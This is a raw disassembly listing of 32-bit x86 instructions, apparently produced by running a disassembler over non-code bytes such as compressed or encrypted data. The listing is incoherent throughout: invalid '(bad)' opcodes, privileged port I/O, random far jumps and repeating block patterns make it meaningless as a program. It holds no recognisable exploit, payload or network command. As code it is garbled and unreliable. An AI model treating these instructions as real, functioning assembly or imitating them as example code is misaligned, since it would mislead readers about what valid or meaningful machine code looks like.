  41bef7:	or     dh,bh
  41bef9:	push   ebx
  41befa:	mov    eax,ds:0xf6268362
  41beff:	dec    edi
  41bf00:	in     eax,0xe5
  41bf02:	mov    esp,0xf01b2e3b
  41bf07:	js     0x41beb7
  41bf09:	aas    
  41bf0a:	mov    edx,0x58904968
  41bf0f:	and    ebp,DWORD PTR [ecx+0x2e]
  41bf12:	sub    ebx,DWORD PTR [ebx-0x36]
  41bf15:	loop   0x41bf50
  41bf17:	pop    esi
  41bf18:	dec    eax
  41bf19:	xor    DWORD PTR [ecx],eax
  41bf1b:	repnz ins DWORD PTR es:[edi],dx
  41bf1d:	test   al,0x7d
  41bf1f:	pop    esp
  41bf20:	aam    0xc2
  41bf22:	scas   al,BYTE PTR es:[edi]
  41bf23:	cmp    eax,0x6eafb1ee
  41bf28:	adc    DWORD PTR [eax-0x374ca265],edx
  41bf2e:	das    
  41bf2f:	adc    al,0x40
  41bf31:	lahf   
  41bf32:	pop    ebp
  41bf33:	int3   
  41bf34:	enter  0x2d58,0x3d
  41bf38:	rcl    al,cl
  41bf3a:	mov    ah,0xb0
  41bf3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3d:	ret    
  41bf3e:	nop
  41bf3f:	xor    al,BYTE PTR [eax]
  41bf41:	sar    DWORD PTR ss:[esi+0x60],cl
  41bf45:	leave  
  41bf46:	pop    edx
  41bf47:	test   BYTE PTR [eax-0x3d134ec8],0x7b
  41bf4e:	mov    bh,BYTE PTR [eax*2-0x7736c0c1]
  41bf55:	cwde   
  41bf56:	and    ecx,esp
  41bf58:	jmp    DWORD PTR [edi+0x2b9787bc]
  41bf5e:	es pop es
  41bf60:	cmp    ebp,DWORD PTR [ecx]
  41bf62:	call   FWORD PTR [ecx+0x1f]
  41bf65:	push   ecx
  41bf66:	and    al,0xa8
  41bf68:	or     esi,ecx
  41bf6a:	jne    0x41bf2f
  41bf6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf6d:	add    BYTE PTR [eax],bl
  41bf6f:	in     eax,dx
  41bf70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf71:	add    al,0xd2
  41bf73:	or     al,0x9b
  41bf75:	and    BYTE PTR [ebx],al
  41bf77:	ja     0x41befa
  41bf79:	mov    esp,DWORD PTR [ebx+0x20a2e992]
  41bf7f:	mov    ds:0x367c054c,al
  41bf84:	mov    edi,0x3da96183
  41bf89:	sub    al,0x55
  41bf8b:	jle    0x41bf7b
  41bf8d:	dec    esp
  41bf8e:	mov    DWORD PTR [ecx+0x0],0x0
	...
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	push   es
  41c001:	ja     0x41c01a
  41c003:	cmp    eax,0x12934
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	cdq    
  41c00d:	xchg   esp,eax
  41c00e:	cmc    
  41c00f:	popa   
  41c010:	pop    ebp
  41c011:	adc    edi,DWORD PTR [edx]
  41c013:	jns    0x41c07a
  41c015:	add    al,0x19
  41c017:	sbb    eax,0x537f0aa3
  41c01c:	xchg   ebp,eax
  41c01d:	iret   
  41c01e:	icebp  
  41c01f:	pop    edx
  41c020:	pop    edx
  41c021:	fcom   DWORD PTR [eax-0x6a]
  41c024:	out    0x33,al
  41c026:	(bad)  
  41c027:	aaa    
  41c028:	adc    BYTE PTR [esi+esi*1],dl
  41c02b:	lahf   
  41c02c:	mov    WORD PTR ds:0xbfa3e000,ds
  41c032:	sub    bl,ch
  41c034:	dec    ebp
  41c035:	(bad)  
  41c036:	cmp    al,0x22
  41c038:	add    BYTE PTR [eax+0x32],0xa5
  41c03c:	js     0x41bffb
  41c03e:	xchg   ebp,eax
  41c03f:	cli    
  41c040:	cmp    edx,DWORD PTR [esi-0x55cedb00]
  41c046:	aas    
  41c047:	arpl   WORD PTR cs:[ebx-0x3ca999f1],di
  41c04e:	imul   ecx,DWORD PTR [ebx+0x7c],0x543f736a
  41c055:	jae    0x41c097
  41c057:	add    DWORD PTR [ebp-0x26],esi
  41c05a:	aaa    
  41c05b:	(bad)
  41c05e:	pop    ds
  41c05f:	mov    edi,0xf902d773
  41c064:	pop    eax
  41c065:	mov    esi,0xb2fe333d
  41c06a:	icebp  
  41c06b:	inc    edi
  41c06c:	icebp  
  41c06d:	cmp    DWORD PTR [esi+edx*4-0x21a68ebe],ecx
  41c074:	mov    ds:0x6786e9ef,eax
  41c079:	sub    al,0xed
  41c07b:	int    0x32
  41c07d:	pop    esp
  41c07e:	or     BYTE PTR [esi],bl
  41c080:	mov    ebp,0xaffd4cad
  41c085:	jg     0x41c0df
  41c087:	lahf   
  41c088:	dec    ecx
  41c089:	jo     0x41c0e3
  41c08b:	mov    al,ds:0x6074b579
  41c090:	mov    esi,0x9078ebe8
  41c095:	sub    BYTE PTR [esi+esi*1-0x26],0xfa
  41c09a:	fcomp  QWORD PTR [ebx+0x5c001bdf]
  41c0a0:	aad    0x5e
  41c0a2:	sbb    eax,0xa65f12f8
  41c0a7:	sub    ebp,ebp
  41c0a9:	or     dh,BYTE PTR ds:0x6e828249
  41c0af:	int3   
  41c0b0:	dec    esp
  41c0b1:	out    0xf7,al
  41c0b3:	mov    ebp,0xe0108183
  41c0b8:	sub    ebp,DWORD PTR [esi]
  41c0ba:	inc    esp
  41c0bb:	jg     0x41c124
  41c0bd:	popa   
  41c0be:	adc    esp,DWORD PTR [ebx]
  41c0c0:	jge    0x41c0f1
  41c0c2:	inc    esp
  41c0c3:	retf   
  41c0c4:	xchg   edx,eax
  41c0c5:	retf   
  41c0c6:	add    edx,DWORD PTR ds:0x3a4d6744
  41c0cc:	add    al,0x64
  41c0ce:	xchg   ecx,eax
  41c0cf:	lds    ebp,FWORD PTR ds:0xd55042d4
  41c0d5:	inc    ebp
  41c0d6:	xchg   edi,edi
  41c0d8:	xchg   edx,eax
  41c0d9:	sahf   
  41c0da:	ficomp WORD PTR ds:0xd6217fbd
  41c0e0:	mov    BYTE PTR [ecx+esi*2+0x13378ce9],bh
  41c0e7:	mov    ah,0xd7
  41c0e9:	pop    edx
  41c0ea:	gs push ss
  41c0ec:	test   BYTE PTR [ecx-0x6c31611e],dh
  41c0f2:	push   0x6e
  41c0f4:	mov    ds:0x9431afd1,al
  41c0f9:	cwde   
  41c0fa:	inc    ebp
  41c0fb:	inc    edx
  41c0fc:	ins    BYTE PTR es:[edi],dx
  41c0fd:	repnz iret 
  41c0ff:	std    
  41c100:	pop    esp
  41c101:	loopne 0x41c0da
  41c103:	push   edi
  41c104:	jnp    0x41c17e
  41c106:	test   al,0x2b
  41c108:	lods   eax,DWORD PTR ds:[esi]
  41c109:	loopne 0x41c0a3
  41c10b:	mov    edi,0x72f92ce4
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0xe21263e9,eax
  41c183:	ret    0x2a38
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	cli    
  41c18d:	push   esp
  41c18e:	xchg   edi,eax
  41c18f:	ja     0x41c193
  41c191:	push   edx
  41c192:	pop    es
  41c193:	(bad)
  41c196:	sbb    al,0xdc
  41c198:	xor    al,BYTE PTR [ebx+0x1f]
  41c19b:	int    0x51
  41c19d:	pop    ds
  41c19e:	dec    ebx
  41c19f:	shr    BYTE PTR [eax+0x63533222],cl
  41c1a5:	into   
  41c1a6:	das    
  41c1a7:	in     al,dx
  41c1a8:	std    
  41c1a9:	push   cs
  41c1aa:	push   edx
  41c1ab:	repnz scas eax,DWORD PTR es:[edi]
  41c1ad:	xor    al,BYTE PTR [ebx-0x2efad4a7]
  41c1b3:	hlt    
  41c1b4:	mov    dh,0x84
  41c1b6:	adc    ebp,esp
  41c1b8:	jg     0x41c199
  41c1ba:	pop    edx
  41c1bb:	cmp    eax,0x3e6d50ad
  41c1c0:	xor    ebx,esi
  41c1c2:	mov    al,ds:0xb246e93
  41c1c7:	mov    esi,0xa96c908c
  41c1cc:	into   
  41c1cd:	fstp   DWORD PTR [eax-0x58]
  41c1d0:	jmp    0xe891a722
  41c1d5:	fistp  DWORD PTR [eax-0x5aa570bf]
  41c1db:	cmp    esp,DWORD PTR [esi]
  41c1dd:	mov    ah,0xcd
  41c1df:	adc    bh,BYTE PTR [ebx]
  41c1e1:	in     eax,dx
  41c1e2:	fwait
  41c1e3:	rcr    BYTE PTR [edi],0xff
  41c1e6:	mov    WORD PTR [ebx+eiz*2],fs
  41c1e9:	aad    0x17
  41c1eb:	sub    al,0x67
  41c1ed:	pop    esi
  41c1ee:	sbb    ebx,DWORD PTR [ecx+eiz*1-0x734e1225]
  41c1f5:	js     0x41c23c
  41c1f7:	into   
  41c1f8:	mov    eax,0xcba91aa
  41c1fd:	iret   
  41c1fe:	out    dx,eax
  41c1ff:	xchg   ebx,eax
  41c200:	ret    
  41c201:	sub    eax,DWORD PTR [esi-0xd7209a4]
  41c207:	cs iret 
  41c209:	jmp    0x745e0444
  41c20e:	in     al,0xee
  41c210:	arpl   WORD PTR [edi+0x184a03c2],bp
  41c216:	cli    
  41c217:	call   0x95c8b39d
  41c21c:	xchg   edx,eax
  41c21d:	lods   al,BYTE PTR ds:[esi]
  41c21e:	ja     0x41c1c1
  41c220:	scas   eax,DWORD PTR es:[edi]
  41c221:	in     eax,dx
  41c222:	enter  0xabd3,0x9
  41c226:	out    dx,al
  41c227:	dec    esp
  41c228:	js     0x41c1e9
  41c22a:	mov    dh,BYTE PTR [ebp-0x31]
  41c22d:	sti    
  41c22e:	cli    
  41c22f:	push   ds
  41c230:	cmp    al,0x93
  41c232:	mov    dh,0xf7
  41c234:	jnp    0x41c2a9
  41c236:	mov    WORD PTR [edx],gs
  41c238:	mov    DWORD PTR [edi+0x41],esi
  41c23b:	dec    ebp
  41c23c:	in     al,0x9a
  41c23e:	mov    ds:0x84032645,eax
  41c243:	sub    edx,ebx
  41c245:	pop    ebx
  41c246:	imul   eax,esi,0x51
  41c249:	rcl    BYTE PTR [eax-0x10],0x1b
  41c24d:	sbb    DWORD PTR [ecx],esi
  41c24f:	jp     0x41c251
  41c251:	sub    DWORD PTR [ecx+ebx*2],ebp
  41c254:	cmp    eax,0x46c040e9
  41c259:	repnz pop ds
  41c25b:	mov    dl,BYTE PTR [esi-0x4c]
  41c25e:	mov    edi,0x68f1eda
  41c263:	test   dh,0x5
  41c266:	jnp    0x41c27d
  41c268:	mov    ds:0x3d4d586c,eax
  41c26d:	int3   
  41c26e:	cmp    esi,DWORD PTR ds:0x9567082c
  41c274:	adc    DWORD PTR [esi],0x9ede5737
  41c27a:	imul   ecx,DWORD PTR [esp+ebp*2-0x17],0xffffffc7
  41c27f:	sbb    al,0xc9
  41c281:	ins    DWORD PTR es:[edi],dx
  41c282:	cmp    BYTE PTR [edx],ah
  41c284:	daa    
  41c285:	or     al,0x6e
  41c287:	popa   
  41c288:	je     0x41c290
  41c28a:	push   cs
  41c28b:	ins    BYTE PTR es:[edi],dx
  41c28c:	fdiv   QWORD PTR [ebx-0x50]
  41c28f:	pop    esi
	...
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	aaa    
  41c301:	inc    esp
  41c302:	or     eax,0x12b3cca
  41c307:	add    BYTE PTR [ecx+eax*1],al
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	mov    eax,ds:0xaf380e98
  41c311:	mov    al,0xa8
  41c313:	mov    ds:0xf31803b8,eax
  41c318:	fdivr  QWORD PTR ds:0xde501f5
  41c31e:	pop    eax
  41c31f:	xor    BYTE PTR [ecx-0x19],dh
  41c322:	and    BYTE PTR [edx-0x24],al
  41c325:	xor    esi,DWORD PTR [eax+ebx*8+0x4f]
  41c329:	mov    fs,WORD PTR [esi+0x2105494c]
  41c32f:	adc    DWORD PTR [eax+edi*8],esp
  41c332:	cwde   
  41c333:	pop    edx
  41c334:	cmp    eax,0x344c9ca9
  41c33a:	mov    ecx,0xe0bed16c
  41c33f:	arpl   WORD PTR [edi+ecx*1-0x54dfded9],bp
  41c346:	jno    0x41c309
  41c348:	lods   al,BYTE PTR ds:[esi]
  41c349:	fwait
  41c34a:	jge    0x41c375
  41c34c:	pop    edx
  41c34d:	xchg   esp,eax
  41c34e:	mov    edi,0xe8b72401
  41c353:	add    al,0xfa
  41c355:	cmp    al,0x2f
  41c357:	ss push ebp
  41c359:	sub    bh,BYTE PTR [ebx-0x6c]
  41c35c:	mov    eax,ds:0xf7cfc54b
  41c361:	(bad)  
  41c362:	xor    BYTE PTR [ecx],dh
  41c364:	mov    ch,0x6d
  41c366:	outs   dx,BYTE PTR ds:[esi]
  41c367:	stc    
  41c368:	and    eax,0xd43d9195
  41c36d:	dec    ebp
  41c36e:	mov    ebx,0xf70e4119
  41c373:	retf   0xa55d
  41c376:	fcomp  DWORD PTR [edx+0x1f8d0c35]
  41c37c:	xchg   ebx,eax
  41c37d:	or     esp,DWORD PTR [ebx+0x5d889170]
  41c383:	and    eax,0xa486097c
  41c388:	lahf   
  41c389:	(bad)  
  41c38a:	jo     0x41c377
  41c38c:	loopne 0x41c3e8
  41c38e:	adc    ecx,DWORD PTR [edi-0x4c]
  41c391:	cmp    cl,BYTE PTR [eax-0x11]
  41c394:	inc    eax
  41c395:	loop   0x41c3f3
  41c397:	mov    bh,al
  41c399:	bound  esi,QWORD PTR [ecx+0x779e5c45]
  41c39f:	sub    eax,0xcaba0463
  41c3a4:	(bad)  
  41c3a5:	push   ebx
  41c3a6:	stos   BYTE PTR es:[edi],al
  41c3a7:	jnp    0x41c396
  41c3a9:	lods   eax,DWORD PTR ds:[esi]
  41c3aa:	or     esi,DWORD PTR [eax+0x27431f2]
  41c3b0:	ret    0x7ff9
  41c3b3:	pop    ds
  41c3b4:	sub    BYTE PTR [edx+0x7ac69c54],al
  41c3ba:	mov    ds:0x2e32fab7,eax
  41c3bf:	loope  0x41c434
  41c3c1:	mov    dl,0xdd
  41c3c3:	loop   0x41c3e0
  41c3c5:	(bad)  
  41c3c6:	out    dx,eax
  41c3c7:	and    DWORD PTR [edi-0x6b0c425c],0x8c30ee7b
  41c3d1:	sbb    eax,0x3b86e5a1
  41c3d6:	mov    BYTE PTR [ecx+0x48e613d1],bl
  41c3dc:	and    BYTE PTR [ecx+0x459bb54c],cl
  41c3e2:	aas    
  41c3e3:	fisttp WORD PTR [ebx-0x4e047d3f]
  41c3ea:	pop    esp
  41c3eb:	push   ebx
  41c3ec:	push   0x28
  41c3ee:	test   al,0xdd
  41c3f0:	mov    edx,0x9b64e32c
  41c3f5:	gs int3 
  41c3f7:	sub    BYTE PTR [eax],cl
  41c3f9:	sbb    edx,DWORD PTR [edi+eiz*4+0x5a]
  41c3fd:	sbb    al,0x45
  41c3ff:	js     0x41c39a
  41c401:	fisttp DWORD PTR [edx]
  41c403:	repz xchg ch,al
  41c406:	lods   eax,DWORD PTR ds:[esi]
  41c407:	and    al,0x55
  41c409:	imul   edi,DWORD PTR [ebx-0x50],0x68
  41c40d:	mov    dl,0x9c
  41c40f:	pop    edi
	...
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	sar    al,1
  41c482:	inc    ecx
  41c483:	sbb    eax,0x12c40
  41c488:	add    al,0x1
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	popf   
  41c48d:	sar    DWORD PTR [ebx+0x527e7fd4],1
  41c493:	jae    0x41c49e
  41c495:	cmp    dl,BYTE PTR [ebx+0x2a]
  41c498:	adc    al,0xe1
  41c49a:	jl     0x41c4fd
  41c49c:	xchg   esi,eax
  41c49d:	inc    edx
  41c49e:	arpl   WORD PTR [edx*1-0x511eaefd],cx
  41c4a5:	dec    edi
  41c4a6:	(bad)  
  41c4a7:	shl    ch,1
  41c4a9:	out    dx,al
  41c4aa:	dec    edx
  41c4ab:	int3   
  41c4ac:	sbb    DWORD PTR [ebx+0x689bd9a5],0x45
  41c4b3:	fisttp WORD PTR [bp+si-0x4565]
  41c4b8:	dec    esi
  41c4b9:	sub    ah,BYTE PTR [edx+eax*2-0x72efb479]
  41c4c0:	sub    BYTE PTR ds:0x8a15dd54,cl
  41c4c6:	loop   0x41c45b
  41c4c8:	fisttp WORD PTR [ebx+0x300ccf0d]
  41c4ce:	popf   
  41c4cf:	mov    edi,0x238b46c8
  41c4d4:	test   DWORD PTR [ecx-0x2698a55],ebx
  41c4da:	sub    dl,BYTE PTR [ecx-0x5daabfee]
  41c4e0:	data16 mov cl,0xb7
  41c4e3:	lods   eax,DWORD PTR ds:[esi]
  41c4e4:	push   ebx
  41c4e5:	shr    DWORD PTR [ebx],0x85
  41c4e8:	jne    0x41c523
  41c4ea:	ret    
  41c4eb:	mov    eax,ds:0xce69b575
  41c4f0:	lahf   
  41c4f1:	push   eax
  41c4f2:	sbb    eax,0x6162aaca
  41c4f7:	xchg   edi,eax
  41c4f8:	inc    edx
  41c4f9:	add    DWORD PTR [eax+0xc],edi
  41c4fc:	xchg   ecx,eax
  41c4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4fe:	push   ss
  41c4ff:	int    0x7d
  41c501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c502:	pop    es
  41c503:	(bad)  
  41c505:	dec    ecx
  41c506:	mov    eax,0x261713b7
  41c50b:	les    esp,FWORD PTR [ecx]
  41c50d:	mov    cl,ch
  41c50f:	dec    esp
  41c510:	jle    0x41c4a4
  41c512:	mov    eax,0xc95848be
  41c517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c518:	or     BYTE PTR [edx+0x788fee41],0xcf
  41c51f:	not    DWORD PTR [ecx-0x6e]
  41c522:	retf   0xbf7a
  41c525:	mov    ecx,DWORD PTR [edx+0x1fa529f2]
  41c52b:	test   eax,0x5cc84c53
  41c530:	and    cl,BYTE PTR [esi+edx*1-0x37]
  41c534:	shr    BYTE PTR [esi+0x9],1
  41c537:	push   0x7e63c7d3
  41c53c:	mov    esi,0xfd223e32
  41c541:	add    al,0x79
  41c543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c544:	jne    0x41c599
  41c546:	leave  
  41c547:	cmp    ch,dl
  41c549:	or     ah,dl
  41c54b:	ins    BYTE PTR es:[edi],dx
  41c54c:	mov    edi,0xeb7b1222
  41c551:	repnz mov edx,0x1f87261e
  41c557:	jge    0x41c4ea
  41c559:	jb     0x41c52b
  41c55b:	cdq    
  41c55c:	cli    
  41c55d:	jnp    0x41c5ce
  41c55f:	cmp    dl,al
  41c561:	xchg   BYTE PTR [esi+0x422694b0],bh
  41c567:	inc    esi
  41c568:	mov    dl,0x37
  41c56a:	loope  0x41c537
  41c56c:	and    BYTE PTR [ebx+0x2a],ch
  41c56f:	add    DWORD PTR [edx-0x57],esp
  41c572:	out    dx,eax
  41c573:	out    dx,al
  41c574:	shl    DWORD PTR [edx+edi*1+0x38],1
  41c578:	cld    
  41c579:	ins    BYTE PTR es:[edi],dx
  41c57a:	dec    esi
  41c57b:	rcl    DWORD PTR [ecx+0x5bb7e01b],0x80
  41c582:	rcl    BYTE PTR [ebx],1
  41c584:	cwde   
  41c585:	mul    al
  41c587:	pop    esi
  41c588:	leave  
  41c589:	push   cs
  41c58a:	shr    BYTE PTR [edx-0x80],0x54
  41c58e:	push   esp
  41c58f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0x14ad2bc1
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	fs (bad) 
  41c60e:	std    
  41c60f:	daa    
  41c610:	jnp    0x41c68d
  41c612:	push   gs
  41c614:	mov    ds:0xd5f201f6,eax
  41c619:	sub    DWORD PTR [ecx+0x44c1ab22],ecx
  41c61f:	rcl    bl,cl
  41c621:	div    BYTE PTR [esi-0x29]
  41c624:	shl    DWORD PTR [edx+0x5e],cl
  41c627:	cmp    al,0xa1
  41c629:	dec    edi
  41c62a:	cli    
  41c62b:	cmp    bh,bh
  41c62d:	dec    edx
  41c62e:	stos   DWORD PTR es:[edi],eax
  41c62f:	xchg   esp,eax
  41c630:	rol    BYTE PTR [esi+0x21],1
  41c633:	sub    al,0x33
  41c635:	popa   
  41c636:	imul   edi,ebx,0xb39ed6e6
  41c63c:	bound  ebp,QWORD PTR [ebp-0x1b]
  41c63f:	and    al,BYTE PTR [ecx]
  41c641:	enter  0x2d1a,0x70
  41c645:	mov    cl,0x71
  41c647:	aas    
  41c648:	in     al,dx
  41c649:	pop    esp
  41c64a:	ss dec edx
  41c64c:	mov    edx,0xf2451e89
  41c651:	inc    ebx
  41c652:	test   al,0x13
  41c654:	jg     0x41c64d
  41c656:	daa    
  41c657:	inc    ecx
  41c658:	cmp    dh,0x2a
  41c65b:	mov    ds:0x1a796b25,eax
  41c660:	loopne 0x41c619
  41c662:	outs   dx,BYTE PTR ds:[esi]
  41c663:	cwde   
  41c664:	outs   dx,DWORD PTR ds:[esi]
  41c665:	les    ebp,FWORD PTR [ebx]
  41c667:	(bad)  
  41c668:	arpl   WORD PTR fs:[ecx-0x54],di
  41c66c:	rol    DWORD PTR [edx-0x33044af8],1
  41c672:	in     al,0x68
  41c674:	or     BYTE PTR [ebx],bh
  41c676:	xor    eax,DWORD PTR [ebx+eiz*8]
  41c679:	test   BYTE PTR [esi+0x48cbcdb3],dl
  41c67f:	in     al,dx
  41c680:	xchg   ebx,eax
  41c681:	sub    BYTE PTR [esi],dl
  41c683:	xor    eax,0x88e4e392
  41c688:	sub    DWORD PTR ds:[ebx-0x6c],edi
  41c68c:	xchg   esi,eax
  41c68d:	stos   DWORD PTR es:[edi],eax
  41c68e:	std    
  41c68f:	sub    BYTE PTR [ecx+0x14],0xa
  41c693:	ror    DWORD PTR ds:0x44b397e0,1
  41c699:	sub    BYTE PTR [edi+ebp*4-0x24],ch
  41c69d:	out    dx,eax
  41c69e:	stos   BYTE PTR es:[edi],al
  41c69f:	nop    edi
  41c6a2:	test   al,0x59
  41c6a4:	mov    al,0x5b
  41c6a6:	fs jnp 0x41c69f
  41c6a9:	jecxz  0x41c6bc
  41c6ab:	retf   
  41c6ac:	pop    esi
  41c6ad:	(bad)  [esi]
  41c6af:	and    ecx,DWORD PTR [esi-0x4ab55ca9]
  41c6b5:	jne    0x41c6e7
  41c6b7:	sbb    esi,0x9ad95cb3
  41c6bd:	fadd   DWORD PTR [ebx]
  41c6bf:	sub    esi,DWORD PTR [edx+0x22]
  41c6c2:	int3   
  41c6c3:	pop    es
  41c6c4:	enter  0x7f3c,0x5
  41c6c8:	ror    DWORD PTR [edx],cl
  41c6ca:	shl    BYTE PTR [ebx],1
  41c6cc:	iret   
  41c6cd:	sbb    al,0xdb
  41c6cf:	ret    
  41c6d0:	ret    0xb161
  41c6d3:	pop    esi
  41c6d4:	or     eax,0x497e7c42
  41c6d9:	popa   
  41c6da:	add    esp,ecx
  41c6dc:	or     DWORD PTR [edi],esp
  41c6de:	les    ebp,FWORD PTR [eax]
  41c6e0:	push   ebx
  41c6e1:	fdivr  st(1),st
  41c6e3:	out    0x1b,al
  41c6e5:	push   eax
  41c6e6:	popa   
  41c6e7:	xor    bl,0xd5
  41c6ea:	pop    esi
  41c6eb:	add    eax,0x3a222a1b
  41c6f0:	pop    ebx
  41c6f1:	dec    esi
  41c6f2:	sub    bh,BYTE PTR [edx+edi*8]
  41c6f5:	cs ins DWORD PTR es:[edi],dx
  41c6f7:	dec    esp
  41c6f8:	jle    0x41c6e3
  41c6fa:	shl    DWORD PTR [ecx+0x20],cl
  41c6fd:	sub    BYTE PTR [edx+0x3da954bc],dl
  41c703:	and    edi,eax
  41c705:	mov    eax,DWORD PTR [edx-0x6c]
  41c708:	ins    BYTE PTR es:[edi],dx
  41c709:	cmp    bh,BYTE PTR [ecx+0x4e]
  41c70c:	lods   eax,DWORD PTR ds:[esi]
  41c70d:	inc    ebx
  41c70e:	(bad)  
	...
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	leave  
  41c781:	mov    ds:0x2e480c2c,al
  41c786:	add    DWORD PTR [eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	rol    DWORD PTR [eax],1
  41c78e:	pop    edx
  41c78f:	dec    edx
  41c790:	in     eax,0xb2
  41c792:	or     eax,0x6b621a18
  41c797:	pop    ebx
  41c798:	xchg   ebp,eax
  41c799:	jmp    0x2d79159
  41c79e:	or     ebx,DWORD PTR [edi]
  41c7a0:	pop    eax
  41c7a1:	sub    DWORD PTR [eax+eax*2+0x7063709f],ecx
  41c7a8:	mov    esi,0xfdeb3690
  41c7ad:	mov    esp,0x2ee4dcb
  41c7b2:	call   0x7499dd35
  41c7b7:	mov    cl,0x76
  41c7b9:	push   esp
  41c7ba:	aam    0x4c
  41c7bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7bd:	xchg   DWORD PTR [eax-0x353a45b8],esp
  41c7c3:	data16 shl BYTE PTR [eax-0x4885f707],cl
  41c7ca:	rol    DWORD PTR ds:0x14c85770,0xfb
  41c7d1:	dec    ecx
  41c7d2:	sub    al,0x1f
  41c7d4:	pop    eax
  41c7d5:	inc    edi
  41c7d6:	imul   edi
  41c7d8:	sub    al,0x3e
  41c7da:	test   al,0x5a
  41c7dc:	out    dx,eax
  41c7dd:	dec    ecx
  41c7de:	ret    0x2c58
  41c7e1:	stc    
  41c7e2:	test   eax,0xb4936558
  41c7e7:	jbe    0x41c851
  41c7e9:	loopne 0x41c7ce
  41c7eb:	dec    edi
  41c7ec:	repnz cmp BYTE PTR [ebx+ebp*8-0x32],ah
  41c7f1:	sbb    BYTE PTR [ebx],bh
  41c7f3:	icebp  
  41c7f4:	jp     0x41c7f4
  41c7f6:	test   DWORD PTR [edi-0x5],edx
  41c7f9:	int3   
  41c7fa:	adc    DWORD PTR [edi+0x5b],esi
  41c7fd:	mov    al,ds:0x4332806e
  41c802:	mov    ecx,0x75567623
  41c807:	jno    0x41c810
  41c809:	xchg   esi,eax
  41c80a:	(bad)  
  41c80b:	int    0xe1
  41c80d:	test   al,0xca
  41c80f:	push   ss
  41c810:	fsubr  DWORD PTR [ebx-0x45892a2d]
  41c816:	jae    0x41c7b6
  41c818:	inc    edi
  41c819:	xchg   edx,eax
  41c81a:	ins    BYTE PTR es:[edi],dx
  41c81b:	pop    edx
  41c81c:	sub    DWORD PTR [eax],0x93a30d6
  41c822:	xchg   edi,esp
  41c824:	outs   dx,BYTE PTR ds:[esi]
  41c825:	cld    
  41c826:	jbe    0x41c7ef
  41c828:	adc    ch,BYTE PTR [edi+0x11167519]
  41c82e:	ins    DWORD PTR es:[edi],dx
  41c82f:	jbe    0x41c86b
  41c831:	in     eax,0x6
  41c833:	mov    dl,0xf9
  41c835:	jae    0x41c8b6
  41c837:	pop    es
  41c838:	mov    al,BYTE PTR [ebx]
  41c83a:	push   esi
  41c83b:	int3   
  41c83c:	inc    ebx
  41c83d:	les    edi,FWORD PTR [esi]
  41c83f:	xchg   DWORD PTR [eax+edi*8+0x77b09d8d],esp
  41c846:	jnp    0x41c88b
  41c848:	mov    WORD PTR [edi],gs
  41c84a:	ror    DWORD PTR [ebx],cl
  41c84c:	jmp    0xb1a84e63
  41c851:	jl     0x41c89c
  41c853:	cmp    eax,0xeeac94f6
  41c858:	es mov dh,0x66
  41c85b:	mov    dh,0x6c
  41c85d:	cli    
  41c85e:	jl     0x41c8d3
  41c860:	in     al,0x33
  41c862:	push   edi
  41c863:	jo     0x41c82f
  41c865:	pop    ebp
  41c866:	jo     0x41c7ef
  41c868:	jnp    0x41c815
  41c86a:	sub    BYTE PTR [esi],cl
  41c86c:	clts   
  41c86e:	mov    eax,ss:0x93858b31
  41c874:	ins    DWORD PTR es:[edi],dx
  41c875:	mov    edx,0x927bb9d2
  41c87a:	dec    edx
  41c87b:	mov    ss,WORD PTR [ebp-0x77]
  41c87e:	sahf   
  41c87f:	sar    BYTE PTR [edi+0x604e3c84],1
  41c885:	inc    ebx
  41c886:	add    BYTE PTR [esi-0x30],0xb0
  41c88a:	sub    eax,0xa844d42c
  41c88f:	test   eax,0x0
	...
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    eax,esp
  41c901:	stos   DWORD PTR es:[edi],eax
  41c902:	repz ror DWORD PTR [edi+ebp*1+0x1],0x0
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	(bad)  
  41c90d:	mov    eax,0x6e7cefd0
  41c912:	or     ah,BYTE PTR [edi]
  41c914:	fist   DWORD PTR [edx-0xb96c33c]
